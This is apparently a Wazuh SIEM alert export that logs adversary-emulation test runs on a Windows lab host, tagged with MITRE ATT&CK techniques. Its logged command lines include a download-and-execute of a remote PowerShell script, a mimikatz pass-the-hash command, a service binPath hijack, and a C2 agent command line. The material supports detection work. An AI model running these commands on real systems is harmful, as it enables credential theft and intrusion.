wazuh-alerts-4.x-2024.11.30,2vrJe5MBRlc-D5DFRR27,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 06:36:43.518
ProcessGuid: {15959494-B27B-674A-A105-000000000D00}
ProcessId: 4916
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing); $macrocode = \""   Open `\""C:\Users\Public\art.jse`\"" For Output As #1`n   Write #1, `\""WScript.Quit`\""`n   Close #1`n   Shell`$ `\""ping 8.8.8.8`\""`n\""; Invoke-MalDoc -macroCode $macrocode -officeProduct \""Word\""""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:36:43.519973700Z,54206,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,6,Powershell executed script from suspicious location,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92029, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:36:44.580",EventChannel,1732948604.771267,"Nov 30, 2024 @ 06:36:44.580", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4916, , , , , , , , , , ,"[""PowerShell""]","[""T1059.001""]","[""Execution""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-B27B-674A-A105-000000000D00},2024-11-30 06:36:43.518,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \\\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\"" -UseBasicParsing); $macrocode = \\\""   Open `\\\""C:\\Users\\Public\\art.jse`\\\"" For Output As #1`n   Write #1, `\\\""WScript.Quit`\\\""`n   Close #1`n   Shell`$ `\\\""ping 8.8.8.8`\\\""`n\\\""; Invoke-MalDoc -macroCode $macrocode -officeProduct \\\""Word\\\""\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,6vrPe5MBRlc-D5DFmh3n,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 06:43:37.678
ProcessGuid: {15959494-B419-674A-B005-000000000D00}
ProcessId: 4132
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C %%tmp%%\mimikatz\x64\mimikatz.exe ""sekurlsa::pth /user:Administrator /domain:%%userdnsdomain%% /ntlm:cc36cf7a8514893efccd3324464tkg1a""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:43:37.680416500Z,54341,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:43:38.763",EventChannel,1732949018.834085,"Nov 30, 2024 @ 06:43:38.763", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4132, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-B419-674A-B005-000000000D00},2024-11-30 06:43:37.678,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C %%tmp%%\\mimikatz\\x64\\mimikatz.exe \""sekurlsa::pth /user:Administrator /domain:%%userdnsdomain%% /ntlm:cc36cf7a8514893efccd3324464tkg1a\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,1PrHe5MBRlc-D5DFNh1g,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:34:29.538
ProcessGuid: {15959494-B1F5-674A-9705-000000000D00}
ProcessId: 6804
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_w4miqts3.uuj.ps1
CreationUtcTime: 2024-11-30 06:34:29.538
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:34:29.553014800Z,54170,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,6,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:34:30.686",EventChannel,1732948470.751631,"Nov 30, 2024 @ 06:34:30.686", , , , , , , , , , , , ,6804, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B1F5-674A-9705-000000000D00},2024-11-30 06:34:29.538, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_w4miqts3.uuj.ps1,2024-11-30 06:34:29.538, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,8frRe5MBRlc-D5DFIR2S,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:45:11.505
ProcessGuid: {15959494-B477-674A-B305-000000000D00}
ProcessId: 4540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_zbffga51.br5.ps1
CreationUtcTime: 2024-11-30 06:45:11.505
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:45:11.508444800Z,54369,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,16,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:45:12.633",EventChannel,1732949112.843690,"Nov 30, 2024 @ 06:45:12.633", , , , , , , , , , , , ,4540, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B477-674A-B305-000000000D00},2024-11-30 06:45:11.505, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zbffga51.br5.ps1,2024-11-30 06:45:11.505, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,8vrRe5MBRlc-D5DF0R1Z,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:46:04.529
ProcessGuid: {15959494-B4AC-674A-B505-000000000D00}
ProcessId: 3692
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_akyoydha.02z.ps1
CreationUtcTime: 2024-11-30 06:46:04.529
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:46:04.539242700Z,54389,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,17,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:46:05.648",EventChannel,1732949165.846700,"Nov 30, 2024 @ 06:46:05.648", , , , , , , , , , , , ,3692, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B4AC-674A-B505-000000000D00},2024-11-30 06:46:04.529, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_akyoydha.02z.ps1,2024-11-30 06:46:04.529, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,__rVe5MBRlc-D5DFZx1e,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:49:53.816
ProcessGuid: {15959494-B591-674A-C505-000000000D00}
ProcessId: 3880
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_uewvrrl2.f50.ps1
CreationUtcTime: 2024-11-30 06:49:53.816
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:49:53.827955700Z,54446,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,19,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:49:54.968",EventChannel,1732949394.917054,"Nov 30, 2024 @ 06:49:54.968", , , , , , , , , , , , ,3880, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B591-674A-C505-000000000D00},2024-11-30 06:49:53.816, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uewvrrl2.f50.ps1,2024-11-30 06:49:53.816, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,AfrWe5MBRlc-D5DFPh41,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:50:47.823
ProcessGuid: {15959494-B5C7-674A-C805-000000000D00}
ProcessId: 3644
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_m2zp0rjk.xih.ps1
CreationUtcTime: 2024-11-30 06:50:47.823
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:50:47.836262400Z,54468,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,20,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:50:48.972",EventChannel,1732949448.928001,"Nov 30, 2024 @ 06:50:48.972", , , , , , , , , , , , ,3644, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B5C7-674A-C805-000000000D00},2024-11-30 06:50:47.823, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_m2zp0rjk.xih.ps1,2024-11-30 06:50:47.823, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,AvrWe5MBRlc-D5DFPh41,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution
UtcTime: 2024-11-30 06:50:48.084
ProcessGuid: {15959494-B5C8-674A-C905-000000000D00}
ProcessId: 408
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
FileVersion: 4.8.3761.0 built by: NET48REL1
Description: Visual C# Command Line Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: csc.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\mari\AppData\Local\Temp\fs3ye555\fs3ye555.cmdline""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=93CF877F5627E55EC076A656E935042FAC39950E,MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D
ParentProcessGuid: {15959494-B5C7-674A-C805-000000000D00}
ParentProcessId: 3644
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:50:48.085973500Z,54471,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,6,"Powershell script compiling code using CSC.exe, possible malware drop","[""sysmon"",""sysmon_eid1_detections"",""windows""]",92006, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:50:49.003",EventChannel,1732949449.931011,"Nov 30, 2024 @ 06:50:49.003", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,408, , , , , , , , , , ,"[""Compile After Delivery""]","[""T1027.004""]","[""Defense Evasion""]", , , ,csc.exe,C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe,Microsoft® .NET Framework, , ,Visual C# Command Line Compiler, , ,{15959494-B5C8-674A-C905-000000000D00},2024-11-30 06:50:48.084,"SHA1=93CF877F5627E55EC076A656E935042FAC39950E,MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D","technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution",Microsoft Corporation,4.8.3761.0 built by: NET48REL1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B5C7-674A-C805-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop\""",0x107a6b,3644,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\mari\\AppData\\Local\\Temp\\fs3ye555\\fs3ye555.cmdline\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,B_rYe5MBRlc-D5DFTR6T,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 06:53:04.682
ProcessGuid: {15959494-B650-674A-D105-000000000D00}
ProcessId: 3624
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C sc config Fax binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \""write-host 'T1543.003 Test'\"""" && sc start Fax
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:53:04.684258400Z,54527,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,7,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:53:05.758",EventChannel,1732949585.961398,"Nov 30, 2024 @ 06:53:05.758", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3624, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-B650-674A-D105-000000000D00},2024-11-30 06:53:04.682,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C sc config Fax binPath= \""C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\""write-host 'T1543.003 Test'\\\""\"" &amp;&amp; sc start Fax",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,CvrYe5MBRlc-D5DFTR6T,1,1,192.168.117.134,window-agent3,003,Maryam, ,7009,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},2,System,0,"""A timeout was reached (30000 milliseconds) while waiting for the Fax service to connect.""",0,2024-11-30T06:53:04.777989700Z,2053,6132,DESKTOP-QGB4EQH,0,592,ERROR,Service Control Manager,1,false,5,Windows System error event,"[""windows"",""windows_system"",""system_error""]",61102,"[""IV_35.7.d""]","[""4.3""]",windows_eventchannel,log,"Nov 30, 2024 @ 06:53:05.946",EventChannel,1732949585.981378,"Nov 30, 2024 @ 06:53:05.946", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,4600610078000000,30000,Fax, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,BPrWe5MBRlc-D5DFxh7u,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution
UtcTime: 2024-11-30 06:51:27.113
ProcessGuid: {15959494-B5EF-674A-CC05-000000000D00}
ProcessId: 4588
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
FileVersion: 4.8.3761.0 built by: NET48REL1
Description: Visual C# Command Line Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: csc.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\mari\AppData\Local\Temp\deuz0lq2\deuz0lq2.cmdline""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=93CF877F5627E55EC076A656E935042FAC39950E,MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D
ParentProcessGuid: {15959494-B5EE-674A-CB05-000000000D00}
ParentProcessId: 4620
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:51:27.114363500Z,54492,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,6,"Powershell script compiling code using CSC.exe, possible malware drop","[""sysmon"",""sysmon_eid1_detections"",""windows""]",92006, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:51:28.033",EventChannel,1732949488.942178,"Nov 30, 2024 @ 06:51:28.033", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4588, , , , , , , , , , ,"[""Compile After Delivery""]","[""T1027.004""]","[""Defense Evasion""]", , , ,csc.exe,C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe,Microsoft® .NET Framework, , ,Visual C# Command Line Compiler, , ,{15959494-B5EF-674A-CC05-000000000D00},2024-11-30 06:51:27.113,"SHA1=93CF877F5627E55EC076A656E935042FAC39950E,MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D","technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution",Microsoft Corporation,4.8.3761.0 built by: NET48REL1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B5EE-674A-CB05-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop\""",0x107a6b,4620,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths 